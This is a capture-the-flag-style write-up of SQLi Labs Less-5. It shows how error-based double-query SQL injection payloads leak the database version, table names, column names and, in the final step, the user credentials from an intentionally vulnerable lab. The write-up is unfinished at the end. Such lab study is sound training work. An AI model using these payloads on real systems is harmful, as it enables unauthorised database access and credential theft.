Hello guys,

This is the write-up for Less-5 'GET- Double Injection - Single Quotes - string' from SQLi Labs

Starting by adding id and numeric parameter to the URL: ``` [URL]/?id=1 ```

The Output Displayed in the browser is :

```
You are in...........
```
and same output was displayed for all ids from 1-14
trying ``` ?id = 1\ ```,

syntax error was returned ``` near ''1\' LIMIT 0,1' at line 1 ```, so we can understand that our input goes inside single quotes.

trying ``` ?id = 1' AND (SELECT database()) --+ ```, no ouput is returned.

There appears to be no output visible except " You are in..........." when all the syntax and conditions are true and when there are errors.

We can continue by using a double query payload to get an output via errors..

using the MySQL error with count(),floor(), rand() and group()

``` 
?id=1' AND (SELECT 1 FROM(SELECT COUNT(*), concat( version(), 0x3a, FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--+
```
it returns ``` Duplicate entry '10.4.17-MariaDB:1' for key 'group_key'```

This error is returned because due to a bug in MySQL when group aggregates the random values produced by ```floor(rand()*2)``` which are 0 or 1 in the temporary table we create and redundancy introduces the errror.

so continuing with,

```
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a ,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema= database() LIMIT 0,1) , 0x3a, FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)--+
```
where two temporary tables called a and b ,are created with and the Limits are specified as ```Operand should contain 1 column(s)```

...and the following is returned
```
Duplicate entry ':emails:1' for key 'group_key'
```
So, continuing by changing to LIMIT 0,1 inside temporary table a to LIMIT 1,1 

```Duplicate entry ':referers:1' for key 'group_key'``` is returned. 

with LIMIT 2,1 ``` Duplicate entry ':uagents:1' for key 'group_key' ```,

```Duplicate entry ':users:1' for key 'group_key'``` with LIMIT 3,1.

So from previous Lesssons, users is the table we dumped the login database from, so continuing by finding columns in 'users' table
```
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a ,(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name= 'users' LIMIT 0,1) , 0x3a, FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)--+
```
using the above statement, ```Duplicate entry ':USER:1' for key 'group_key'```

is returned, here USER is the first column's name...


so going on by changing LIMIT,  the username and password columns and can be found  at LIMIT 4,1 and LIMIT 5,1 respectively.

continuing with,
```
?id=1' AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT group_concat(username, 0x7c, password) FROM users),FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a)b)--+

```
# not finished



refernces:

https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

https://medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c
